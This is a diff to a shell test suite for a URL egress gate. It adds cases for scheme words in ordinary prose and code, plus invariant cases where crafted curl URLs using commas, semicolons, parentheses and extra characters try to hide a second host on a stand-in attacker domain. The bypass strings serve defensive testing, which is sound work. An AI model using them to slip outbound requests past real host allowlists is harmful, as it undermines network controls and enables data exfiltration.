@@ -583,7 +583,14 @@ check "an expression in userinfo does not hide the host" block "$sample_dir/a3.y
   '      - run: curl "https://${{ env.X }}@evil.example.net/v1"'
 
 # TWO @ signs. Every URL parser splits the authority at the LAST one, and
-# `${hostport##*@}` is written to that rule, so a grammar that stopped at
+# What these cases pin is the USERINFO BRANCH OF `url_re`, not the
+# `${hostport##*@}` derivation that the same rule is written to. Reverting
+# that derivation to `${hostport#*@}` leaves all 150 cases passing, because
+# with two or more `@` the first-`@` host still CONTAINS an `@`, and the
+# character check reports it with a different message. That makes the
+# derivation defensive redundancy rather than an untested hole -- but it is
+# not what these four assert, and the comment used to say it was.
+# A grammar that stopped at
 # the first @ handed over the middle component -- a declared host vouching
 # for a destination that is not it.
 # These assert the HOST NAMED, not the exit code, and one of each pair is
@@ -683,6 +690,34 @@ check "a backtick-quoted declared host with a method call" allow "$sample_dir/c7
 check "a JSON array of two declared hosts" allow "$sample_dir/c8.json" \
   '{"u": ["https://erpc.global","https://github.com"]}'
 
+# The slash-collapse rule is anchored on the left. Without that anchor the
+# scheme alternation matched the TAIL of any word, so `flows:`, `rows:` and
+# `Windows:` became a synthetic `ws://` and the gate reported ordinary Rust,
+# TypeScript and prose. The tree passed only because its one near-miss,
+# `Workflows:` in an agent definition, happens to have a space after the
+# colon. `xhttps:` is correctly left alone: that scheme is not special, so no
+# parser applies the slash-skipping rule to it.
+check "a bolded Windows heading in prose" allow "$sample_dir/n1.md" \
+  '**Windows:** download the installer from the release.'
+
+check "a table cell ending in a scheme word" allow "$sample_dir/n2.md" \
+  '| Windows:|yes|'
+
+check "a scheme word followed by text in prose" allow "$sample_dir/n3.md" \
+  'Supported: Linux, macOS, Windows:x86_64 and more.'
+
+check "a scheme word followed by a bracket" allow "$sample_dir/n4.md" \
+  'Known workflows:[ci] and [release] run on push.'
+
+check "a rust binding whose name ends in a scheme" allow "$sample_dir/n5.rs" \
+  'let flows:u32 = 1;'
+
+check "a typescript binding ending in a scheme" allow "$sample_dir/n6.ts" \
+  'const rows:Array<T> = [];'
+
+check "a shell string whose word ends in a scheme" allow "$sample_dir/n7.sh" \
+  'echo "shows:$x"'
+
 # --- the invariant ------------------------------------------------------
 #
 # Every shape-specific case above pins one bypass. This pins the property
@@ -778,6 +813,38 @@ invariant "a backtick after a declared host does not either" \
 invariant "a comma then a slashless second URL is still judged" \
   'curl https://erpc.global,https:two.evil.example.net/x' \
   'two.evil.example.net'
+
+# THE SPLIT'S OWN BOUNDARY. The separator split only fires when one of
+# `)`, `,`, `;` or a backtick sits IMMEDIATELY before a scheme. Put any one
+# character the host class admits in between and it does not fire: the match
+# runs to the second scheme's colon again and the tail is `xhttps`, which
+# carries no dotted pair. Every one of these was silent at c1c4a54 -- the
+# round-11 defect, one character away from the round-11 fix -- and the
+# trailing-scheme-word arm of the tail test is what catches them. It had been
+# deleted as redundant on a measurement that no case could contradict.
+invariant "a letter between a comma and the next scheme" \
+  'curl https://erpc.global,xhttps://two.evil.example.net/x' \
+  'erpc.global,xhttps'
+
+invariant "a letter between a semicolon and the next scheme" \
+  'curl https://erpc.global;ahttps://two.evil.example.net/x' \
+  'erpc.global;ahttps'
+
+invariant "a letter between a paren and the next scheme" \
+  'curl "(https://erpc.global)qhttps://two.evil.example.net/x"' \
+  'erpc.global)qhttps'
+
+invariant "punctuation between a comma and the next scheme" \
+  'curl https://erpc.global,_.https://two.evil.example.net/x' \
+  'erpc.global,_.https'
+
+invariant "a scheme-like word before the next scheme" \
+  'curl https://erpc.global,wshttps://two.evil.example.net/x' \
+  'erpc.global,wshttps'
+
+invariant "a digit between a comma and the next scheme" \
+  'curl https://erpc.global,0https://two.evil.example.net/x' \
+  'erpc.global,0https'
 
 invariant "two plain URLs on one line are both named" \
   'const a = "https://one.evil.example.net/1"; const b = "https://two.evil.example.net/2";' \
